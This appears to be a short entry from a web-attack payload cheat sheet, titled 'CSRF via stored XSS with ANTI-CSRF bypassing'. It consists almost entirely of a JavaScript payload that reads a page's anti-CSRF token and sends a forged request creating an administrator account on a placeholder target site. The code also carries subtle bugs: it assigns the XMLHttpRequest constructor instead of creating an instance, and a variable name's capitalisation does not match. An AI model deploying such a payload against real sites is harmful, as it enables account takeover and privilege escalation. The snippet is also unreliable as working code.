## CSRF via stored XSS with ANTI-CSRF bypassing

```
<script type="text/javascript">

function addUser(token) {
  var url = "http://target.site/add_user.php";
  var params = "name=Hacker&surname=Malicious&email=hacker@gmail.com&Role=ADMIN&Submit=&CSRFToken=" + token;
  var CSRF = new XMLHttpRequest();
  CSRF.open("POST", url, true);
  CSRF.withCredentials = "true";
  CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  CSRF.send(params);
}

// Extract The Token

var XHR = XMLHttpRequest;
XHR.onreadystatechange = function() {
  if(XHR.readyState == 4) {
      var htmlSource = XHR.responseText; //the source of user.php
      var parser = new DOMParser().parseFromString(htmlsource, "text/html");
      var token = parser.getElementById('CSRFToken').value;
      addUser(token)
  }
}

XHR.open("GET", "http://target.site/add_user.php" , true);
XHR.send();
 
</script>
```
